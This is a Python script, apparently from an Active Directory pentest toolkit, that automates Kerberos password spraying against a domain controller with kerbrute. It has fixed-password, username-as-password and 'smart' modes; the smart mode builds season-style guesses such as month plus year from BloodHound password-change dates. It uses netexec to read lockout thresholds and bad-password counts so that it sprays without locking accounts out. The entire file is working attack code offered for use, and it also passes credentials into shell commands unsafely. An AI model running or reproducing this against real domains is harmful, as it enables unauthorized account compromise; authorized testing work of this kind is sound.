#!/usr/bin/env python3
import argparse
import subprocess
import tempfile
import re
import os
import sys
import logging
from bloodhound_cli import BloodHoundACEAnalyzer
import curses
from datetime import datetime, timezone

# Configuración inicial de logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def clean_ansi(text):
    """Elimina los códigos ANSI de un texto."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def get_netexec_users(dc_ip, username, password, domain):
    """
    Ejecuta netexec para obtener la lista de usuarios y su BadPW.
    Se utiliza grep y awk para filtrar la salida.
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else 'nxc'
    cmd = (
        f"{nxc_cmd} smb {dc_ip} -u {username} -p {password} -d {domain} --users "
        "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
    )
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando netexec para obtener usuarios: %s", e)
        sys.exit(1)
    users = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        user = parts[0]
        try:
            badpw = int(parts[1])
        except ValueError:
            continue
        users.append((user, badpw))
    return users

def get_account_lockout_threshold(dc_ip, username, password, domain):
    """
    Ejecuta netexec para extraer el account lockout threshold.
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else 'nxc'
    cmd = f"{nxc_cmd} smb {dc_ip} -u {username} -p {password} -d {domain} --pass-pol"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando netexec para obtener la política de lockout: %s", e)
        sys.exit(1)
    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)', result.stdout)
    if match:
        value = match.group(1).strip()
        try:
            return int(value)
        except ValueError:
            return value
    else:
        logger.error("No se pudo obtener el Account lockout threshold del dominio.")
        sys.exit(1)

def read_enabled_users(enabled_users_file):
    """
    Lee desde un archivo la lista de usuarios habilitados (un usuario por línea).
    """
    try:
        with open(enabled_users_file, "r") as f:
            enabled_users = {line.strip() for line in f if line.strip()}
        return enabled_users
    except Exception as e:
        logger.error("Error leyendo la lista de usuarios habilitados: %s", e)
        sys.exit(1)

def curses_menu(stdscr, title, options):
    """
    Muestra un menú interactivo con curses para seleccionar una opción.
    Retorna el índice seleccionado.
    """
    curses.curs_set(0)
    selected = 0
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, title, curses.A_BOLD)
        for idx, option in enumerate(options):
            if idx == selected:
                stdscr.addstr(idx + 2, 2, f"> {option}", curses.A_REVERSE)
            else:
                stdscr.addstr(idx + 2, 2, f"  {option}")
        stdscr.refresh()
        key = stdscr.getch()
        if key in [curses.KEY_UP, ord('k')]:
            selected = (selected - 1) % len(options)
        elif key in [curses.KEY_DOWN, ord('j')]:
            selected = (selected + 1) % len(options)
        elif key in [curses.KEY_ENTER, ord('\n')]:
            return selected

def smart_date_menu():
    """
    Interfaz interactiva con curses para seleccionar:
      - Idioma (English o Spanish)
      - Presentación del mes (Lower, e.g., january2025; o Upper, e.g., January2025)
      - Formato de spray para months (usando el placeholder 'month')
    Retorna una tupla (language, month_case, spray_format_option).
    """
    languages = ["English", "Spanish"]
    case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
    mode_options = ["months"]
    months_formats = [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]
    def curses_logic(stdscr):
        lang_idx = curses_menu(stdscr, "Select language:", languages)
        case_idx = curses_menu(stdscr, "Select month case:", case_options)
        mode_idx = curses_menu(stdscr, "Select spray mode:", mode_options)
        fmt_idx = curses_menu(stdscr, "Select months spray format:", months_formats)
        month_case = "lower" if case_idx == 0 else "upper"
        return languages[lang_idx], month_case, months_formats[fmt_idx]
    return curses.wrapper(curses_logic)

def smart_date_formats():
    """Devuelve la lista de formatos para months con el placeholder 'month'."""
    return [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]

def generate_spray_list(analyzer, domain, smart_params):
    """
    Genera la lista de spray usando datos de bloodhound-cli.
    Si smart_params tiene tres elementos, se asume modo interactivo (curses) y se usa el placeholder "month".
    Si smart_params tiene cuatro elementos, se asume modo no interactivo y smart_params = (lang, type, case, format_option),
    de forma que se usará el placeholder "type".
    Retorna una lista de líneas "user:password".
    """
    if len(smart_params) == 3:
        language, month_case, fmt_option = smart_params
        placeholder = "month"
        def format_value(dt):
            month_eng = dt.strftime("%B")
            if language == "Spanish":
                spanish_months = {
                    "January": "enero", "February": "febrero", "March": "marzo", "April": "abril",
                    "May": "mayo", "June": "junio", "July": "julio", "August": "agosto",
                    "September": "septiembre", "October": "octubre", "November": "noviembre", "December": "diciembre"
                }
                base = spanish_months.get(month_eng, month_eng.lower())
            else:
                base = month_eng
            return base.lower() if month_case == "lower" else base.capitalize()
    else:
        language, smart_type, case_option, fmt_option = smart_params
        placeholder = "type"
        def format_value(_):
            return smart_type.lower() if case_option == "low" else smart_type.capitalize()

    data = analyzer.get_password_last_change(domain)
    spray_lines = []
    for record in data:
        user = record['user']
        ts = record.get('password_last_change')
        try:
            ts_float = float(ts)
            if ts_float == 0:
                wc = record.get('when_created')
                dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
            else:
                dt = datetime.fromtimestamp(ts_float, tz=timezone.utc)
        except Exception as e:
            logger.error(f"Error converting timestamp for user {user}: {e}")
            continue
        year_full = dt.strftime("%Y")
        year_short = dt.strftime("%y")
        type_formatted = format_value(dt)
        def apply_format(fmt_str):
            return fmt_str.format(**{placeholder: type_formatted, "full_year": year_full, "year_short": year_short})
        if fmt_option == "All":
            variants = [fmt for fmt in smart_date_formats() if fmt != "All"]
            spray_candidates = [apply_format(fmt) for fmt in variants]
            password = ",".join(spray_candidates)
        else:
            password = apply_format(fmt_option)
        spray_lines.append(f"{user}:{password}")
    return spray_lines

def write_temp_spray_file(lines):
    """
    Escribe la lista de spray en un archivo temporal ("user:password").
    Retorna la ruta del archivo.
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for line in lines:
        tmp.write(line + "\n")
    tmp.close()
    return tmp.name

def run_smart_kerbrute(domain, dc_ip, temp_file):
    """
    Ejecuta kerbrute bruteforce usando el archivo temporal.
    """
    cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logger.info(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando kerbrute: %s", e)
        logger.error(clean_ansi(e.stdout))
        logger.error(clean_ansi(e.stderr))
        sys.exit(1)

def write_temp_users_file(users):
    """
    Escribe la lista de usuarios elegibles en un archivo temporal.
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for user in users:
        tmp.write(user + "\n")
    tmp.close()
    return tmp.name

def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pass=False, output_dir=None):
    """
    Ejecuta kerbrute passwordspray usando la lista de usuarios.
    Si use_user_as_pass es True se añade --user-as-pass.
    """
    if use_user_as_pass:
        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
    else:
        if spray_password:
            cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
        else:
            cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_users_file]
    if output_dir:
        cmd.extend(["-o", output_dir])
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logger.info(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando kerbrute: %s", e)
        logger.error(clean_ansi(e.stdout))
        logger.error(clean_ansi(e.stderr))
        sys.exit(1)

# --- Main con subcomandos ---
def main():
    parser = argparse.ArgumentParser(
        description="Script para realizar password spraying con kerbrute mediante subcomandos."
    )
    subparsers = parser.add_subparsers(dest="subcommand", required=True, help="Modo de spraying")

    # Subcomando smart (modo smart-date)
    smart_parser = subparsers.add_parser("smart",
        help="Spraying inteligente (smart-date) usando bloodhound-cli; no requiere -u ni -p")
    smart_parser.add_argument("-d", required=True, help="Dominio (usado para bloodhound-cli y kerbrute)")
    smart_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    smart_parser.add_argument("-ul", help="Username para netexec (opcional)")
    smart_parser.add_argument("-pl", help="Password para netexec (opcional)")
    smart_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    smart_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    smart_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    # Parámetros para uso no interactivo (todos deben especificarse o ninguno)
    smart_parser.add_argument("--lang", choices=["English", "Spanish"],
                              help="Idioma para spray: English o Spanish")
    smart_parser.add_argument("--type", choices=["month"], help="Tipo de spray (por ahora, solo 'month')")
    smart_parser.add_argument("-c", "--case", choices=["lower", "upper"],
                              help="Presentación del tipo: 'lower' para minúsculas o 'upper' para mayúsculas")
    available_formats = {
        1: "{type}{full_year}",
        2: "{type}.{full_year}",
        3: "{type}{full_year}.",
        4: "{type}@{full_year}",
        5: "{type}{full_year}!",
        6: "{type}{year_short}",
        7: "{type}.{year_short}",
        8: "{type}{year_short}.",
        9: "{type}@{year_short}",
        10: "{type}{year_short}!"
    }
    format_help = "\n".join([f"{k}: {v}" for k, v in available_formats.items()])
    smart_parser.add_argument("-f", "--format", type=int, choices=range(1, len(available_formats)+1),
                              help=f"ID del formato de spray. Opciones:\n{format_help}\nSi se omite, se muestra menú interactivo.")
    smart_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    # Subcomando password (usa lista de usuarios y contraseña fija -p)
    password_parser = subparsers.add_parser("password",
        help="Spraying con contraseña fija; requiere lista de usuarios (-u) y contraseña (-p)")
    password_parser.add_argument("-d", required=True, help="Dominio (usado para netexec y kerbrute)")
    password_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    password_parser.add_argument("-ul", help="Username para netexec (opcional)")
    password_parser.add_argument("-pl", help="Password para netexec (opcional)")
    password_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    password_parser.add_argument("-u", required=True, help="Ruta a la lista de usuarios habilitados")
    password_parser.add_argument("-p", required=True, help="Contraseña para password spraying (kerbrute)")
    password_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    password_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    password_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    # Subcomando useraspass (usa lista de usuarios y user-as-pass)
    useraspass_parser = subparsers.add_parser("useraspass",
        help="Spraying con user-as-pass; requiere lista de usuarios (-u) y opción --low o --up")
    useraspass_parser.add_argument("-d", required=True, help="Dominio (usado para netexec y kerbrute)")
    useraspass_parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    useraspass_parser.add_argument("-ul", help="Username para netexec (opcional)")
    useraspass_parser.add_argument("-pl", help="Password para netexec (opcional)")
    useraspass_parser.add_argument("-t", type=int, default=0, help="Threshold seguro")
    useraspass_parser.add_argument("-u", required=True, help="Ruta a la lista de usuarios habilitados")
    group_useraspass = useraspass_parser.add_mutually_exclusive_group(required=False)
    group_useraspass.add_argument("--low", action="store_true", help="Utilizar user-as-pass con usuario en minúsculas")
    group_useraspass.add_argument("--up", action="store_true", help="Utilizar user-as-pass con usuario con primera letra en mayúsculas")
    useraspass_parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute")
    useraspass_parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")
    useraspass_parser.add_argument("--debug", action="store_true", help="Activar modo debug")

    args = parser.parse_args()

    # Configurar logging si debug está activado
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logger.debug("Modo debug activado. Mostrando información detallada.")

    # Función común para obtener usuarios elegibles (usando netexec si se proporcionan credenciales)
    def get_eligible_users(domain, users_file, dc_ip, ul, pl, threshold):
        if ul and pl:
            logger.info("[*] Obteniendo Account lockout threshold del dominio...")
            account_threshold = get_account_lockout_threshold(dc_ip, ul, pl, domain)
            logger.info(f"[*] Account lockout threshold obtenido: {account_threshold}")
            if isinstance(account_threshold, int):
                logger.info("[*] Obteniendo usuarios y su BadPW con netexec...")
                netexec_users = get_netexec_users(dc_ip, ul, pl, domain)
                if not netexec_users:
                    logger.error("No se obtuvieron usuarios de netexec.")
                    sys.exit(1)
                logger.info("[*] Leyendo lista de usuarios habilitados...")
                file_users = read_enabled_users(users_file)
                eligible = []
                for user, badpw in netexec_users:
                    if user in file_users:
                        remaining = account_threshold - badpw
                        if remaining > threshold:
                            eligible.append(user)
                        else:
                            logger.debug(f"[-] Usuario {user} no elegible. BadPW: {badpw}, intentos restantes: {remaining}")
                if not eligible:
                    logger.info("No hay usuarios elegibles según el threshold seguro.")
                    sys.exit(0)
                return eligible
            else:
                return list(read_enabled_users(users_file))
        else:
            return list(read_enabled_users(users_file))

    # Procesar subcomandos
    if args.subcommand == "smart":
        if args.debug:
            logging.getLogger().setLevel(logging.DEBUG)
        logger.info("[*] Modo smart activado. Obteniendo datos de password last change desde bloodhound-cli...")
        bh_uri = "bolt://localhost:7687"
        bh_user = "neo4j"
        bh_password = "bloodhound"
        analyzer = BloodHoundACEAnalyzer(bh_uri, bh_user, bh_password)
        # Si se especifican --lang, --type, --case y --format, se usan directamente
        if args.lang and args.type and args.case and (args.format is not None):
            available_formats = {
                1: "{"f"{args.type}""}{full_year}",
                2: "{"f"{args.type}""}.{full_year}",
                3: "{"f"{args.type}""}{full_year}.",
                4: "{"f"{args.type}""}@{full_year}",
                5: "{"f"{args.type}""}{full_year}!",
                6: "{"f"{args.type}""}{year_short}",
                7: "{"f"{args.type}""}.{year_short}",
                8: "{"f"{args.type}""}{year_short}.",
                9: "{"f"{args.type}""}@{year_short}",
                10: "{"f"{args.type}""}{year_short}!"
            }
            if args.format not in available_formats:
                logger.error("Formato ID no válido.")
                sys.exit(1)
            smart_params = (args.lang, args.case, available_formats[args.format])
        else:
            smart_params = smart_date_menu()  # (language, month_case, spray_format_option)
        logger.info(f"[*] Se seleccionó: {smart_params}")
        data = analyzer.get_password_last_change(args.d)
        eligible_users = [record['user'] for record in data]
        spray_list = generate_spray_list(analyzer, args.d, smart_params)
        analyzer.close()
        logger.info(f"[*] Número de usuarios para spraying (smart): {len(eligible_users)}")
        temp_file = write_temp_spray_file(spray_list)
        spray_password = None
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo smart...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, spray_password, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo smart.")

    elif args.subcommand == "password":
        if args.debug:
            logging.getLogger().setLevel(logging.DEBUG)
        logger.info("[*] Modo password activado. Procesando spraying en modo password...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Número de usuarios elegibles para spraying (password): {len(eligible_users)}")
        spray_list = [f"{user}:{args.p}" for user in eligible_users]
        temp_file = write_temp_users_file(eligible_users)
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo password...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo password.")

    elif args.subcommand == "useraspass":
        if args.debug:
            logging.getLogger().setLevel(logging.DEBUG)
        logger.info("[*] Modo useraspass activado. Procesando spraying en modo useraspass...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Número de usuarios elegibles para spraying (useraspass): {len(eligible_users)}")
        use_user_as_pass = False
        if args.low:
            eligible_users = [user.lower() for user in eligible_users]
            use_user_as_pass = True
        elif args.up:
            eligible_users = [user.capitalize() for user in eligible_users]
            use_user_as_pass = True
        else:
            # No case specified: use exact username as password
            use_user_as_pass = True
        temp_file = write_temp_users_file(eligible_users)
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Ejecutando kerbrute en modo useraspass...")
        run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, None, use_user_as_pass=use_user_as_pass, output_dir=args.output)
        os.remove(temp_file)
        logger.info("[*] Proceso completado en modo useraspass.")

if __name__ == "__main__":
    main()